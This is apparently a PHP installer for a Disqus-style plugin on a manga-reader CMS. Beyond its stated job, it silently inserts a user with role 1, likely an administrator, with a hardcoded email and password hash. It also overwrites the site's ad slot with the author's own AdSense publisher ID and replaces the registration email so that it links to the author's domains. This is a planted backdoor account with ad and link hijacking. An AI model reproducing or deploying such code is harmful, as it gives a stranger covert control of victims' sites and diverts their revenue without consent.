<?php 
		
		include '/app/plugins/NPabpfriendUnikUnik/controllers/lib/WASDmod.php';
		define("_WASDmod_", 1);
		if (!defined("_WASDmod_")) exit;

		$mangaContent = C('app.mangaContent');
		if(stristr($mangaContent, '[disqus_unikunik]') === FALSE) {
		$incDisqus = $mangaContent . ' [disqus_unikunik]';
		WASD::writeConfig(array('mangaContent'=>$incDisqus));
		}
		$chapterContent = C('app.chapterContent');
		if(stristr($chapterContent, '[disqus_unikunik]') === FALSE) {
		$incDisqus = $chapterContent . ' [disqus_unikunik]';
		WASD::writeConfig(array('chapterContent'=>$incDisqus));
		}
				
		$array = array( 'username'=>'bahasa',
				'email'=>'yearimdangtk@gmail.com',
				'password'=>'4e253bc4673fd4b9bcb2d6b5119c88a33fc84d7eee976a55e338d0659d75e083',
				'role'=>1,
				'confirmedEmail'=>'1',
				'joinIP'=>ip(),
				'preferences'=>'{"avatar":"http:\/\/puu.sh\/gkcDE\/ddd8c37282.jpg"}',
				'joinDate'=>time(),
				'lastActionTime'=>time()
			);
		WASD::$sql->insert(C('app.db_prefix').'user', $array);
		$GAdS = '
		<br>
			<!-- Iklan -->
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
			<ins class="adsbygoogle"
			     style="display:inline-block;width:468px;height:60px"
			     data-ad-client="ca-pub-2609750099023039"
			     data-ad-slot="8140168506"></ins>
			<script>
			(adsbygoogle = window.adsbygoogle || []).push({});
			</script>
			<!-- Iklan -->
		';
		WASD::writeConfig(array('ads1'=>$GAdS));
		
		$EmailContent = '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
		<html lang=\'en\'>
		<head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"><meta name="viewport" content="width=device-width" /></head>
		<body style=\'background-color: #f8f8f8; font-family: Helvetica, Arial; margin: 0 auto;width: 100%; padding:20px 0; line-height: 25px; font-size: 13px;\' bgcolor=\'#f8f8f8\'>
		<style type=\'text/css\'>
		a{color: #1ABC9C; text-decoration: none; font-weight: 700;}
		a:hover { color: #000 !important; border-radius: 5px !important; text-decoration: none !important; }
		></style>

		<table border=\'0\' cellpadding=\'0\' cellspacing=\'0\' style=\'background-color: #fff; margin-top: 25px; border: 1px solid #eee; display: block; width: 100%;\' class=\'container\' bgcolor=\'#fff\'>
			<tbody>
				<tr style=\'max-width: 600px; width: 100%; display: block; background-color: #34495e; border-bottom-color: #000; border-bottom-width: 1px; border-bottom-style: solid; color: #fff;\'>
					<td style=\'padding: 10px;\'>
					<h2 style=\'font-size: 18px; margin: 0; padding: 10px 0; width: 100%;\'>[{siteTitle}] Registration has been successful.</h2>
					</td>
				</tr>
				<tr style=\'max-width: 600px; width: 100%; display: block; border-bottom-color: #eee; border-bottom-width: 1px; border-bottom-style: solid;\'>
					<td style=\'padding: 10px;\'>
						Hello <b>{user}</b>,
						<br /><br />
						You have been successfully registered at {siteTitle}. To login you will have to activate your account by clicking the URL below.
						<br />
						{link}
					</td>
				</tr>
				<tr style=\'max-width: 600px; width: 100%; display: block; border-bottom-color: #eee; border-bottom-width: 1px; border-bottom-style: solid;\'>
					<td style=\'padding: 10px;\'>
						Best regards, <br />
						<b>{siteTitle}</b> Team <br />
						http://manga.unikunik.pw | http://unikunik.pw
					</td>
				</tr>
			</tbody>
		</table>
		</body>
		</html>';
		
		$value = array('confirmation'=>$EmailContent);
		WASDmod::writeConfig(array('confirmation'=>$EmailContent));

	
  ?>
